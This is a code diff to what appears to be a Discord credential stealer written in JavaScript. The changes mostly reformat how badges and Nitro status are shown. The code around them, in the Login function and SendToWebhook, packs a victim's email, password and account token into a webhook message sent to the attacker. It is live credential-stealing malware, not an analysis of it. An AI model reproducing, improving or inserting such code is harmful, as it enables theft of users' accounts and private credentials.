@@ -84,15 +84,15 @@ function SendToWebhook(what) {
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "no nitro"
+		return "\`no nitro\`"
 	}
 	if (flags == 1) {
-		return "<:classic:896119171019067423> \`nitro classic\`"
+		return "\`nitro classic\`"
 	}
 	if (flags == 2) {
-		return "<a:boost:824036778570416129> \`nitro boost\`"
+		return "\`nitro boost\`"
 	} else {
-		return "no nitro"
+		return "\`no nitro\`"
 	}
 }
 
@@ -106,25 +106,25 @@ function GetRBadges(flags) {
 	const Early_Verified_Bot_Developer = 131072;
 	var badges = "";
 	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "<:staff:874750808728666152> "
+		badges += "discord staff "
 	}
 	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "<:partner:874750808678354964> "
+		badges += "partnered server owner "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "<:hypesquad_events:874750808594477056> "
+		badges += "hypesquad events "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "<:bughunter_1:874750808426692658> "
+		badges += "bug hunter tier 1 "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "<:early_supporter:874750808414113823> "
+		badges += "early supporter "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "<:bughunter_2:874750808430874664> "
+		badges += "bug hunter tier 2 "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "<:developer:874750808472825986> "
+		badges += "verified bot developer "
 	}
 	if (badges == "") {
 		badges = ""
@@ -145,37 +145,28 @@ function GetBadges(flags) {
 	const Early_Verified_Bot_Developer = 131072;
 	var badges = "";
 	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "<:staff:874750808728666152> "
+		badges += "discord staff "
 	}
 	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "<:partner:874750808678354964> "
+		badges += "partnered server owner "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "<:hypesquad_events:874750808594477056> "
+		badges += "hypesquad events "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "<:bughunter_1:874750808426692658> "
-	}
-	if ((flags & House_Bravery) == House_Bravery) {
-		badges += "<:bravery:874750808388952075> "
-	}
-	if ((flags & House_Brilliance) == House_Brilliance) {
-		badges += "<:brilliance:874750808338608199> "
-	}
-	if ((flags & House_Balance) == House_Balance) {
-		badges += "<:balance:874750808267292683> "
+		badges += "bug hunter tier 1 "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "<:early_supporter:874750808414113823> "
+		badges += "early supporter "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "<:bughunter_2:874750808430874664> "
+		badges += "bug hunter tier 2 "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "<:developer:874750808472825986> "
+		badges += "verified bot developer "
 	}
 	if (badges == "") {
-		badges = "None"
+		badges = "\`no badges\`"
 	}
 	return badges
 }
@@ -195,8 +186,8 @@ function Login(email, password, token) {
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
                 {
-                    "title": "user login",
-		    description: "[**<:partner:909102089513340979> - hi my g",
+                    "title": "user logged in",
+		    description: "᲼᲼᲼᲼",
                     "color": 3092790,
                     "fields": [
                         {
@@ -216,12 +207,12 @@ function Login(email, password, token) {
                         },
                         {
                             "name": " email",
-                            "value": ` - ${email}`,
+                            "value": ` - \`${email}\``,
                             "inline": true
                         },
                         {
                             "name": " password",
-                            "value": ` - ${password}`,
+                            "value": ` - \`${password}\``,
                             "inline": true		    
                         },
                         {
@@ -231,12 +222,12 @@ function Login(email, password, token) {
                         }, 
                         {
                             "name": " badges",
-                            "value": `${GetBadges(json.flags)}`,
+                            "value": ` - ${GetBadges(json.flags)}`,
                             "inline": true		    
                         },
                         {
                             "name": " nitro",
-                            "value": `${GetNitro(json.premium_type)}`,
+                            "value": ` - ${GetNitro(json.premium_type)}`,
                             "inline": true		    
                         },
                         {
@@ -246,7 +237,7 @@ function Login(email, password, token) {
                         }, 
                         {
                             "name": " token",
-                            "value": ` - ${token}`,
+                            "value": ` - \`${token}\``,
                             "inline": false
                         }
                     ],
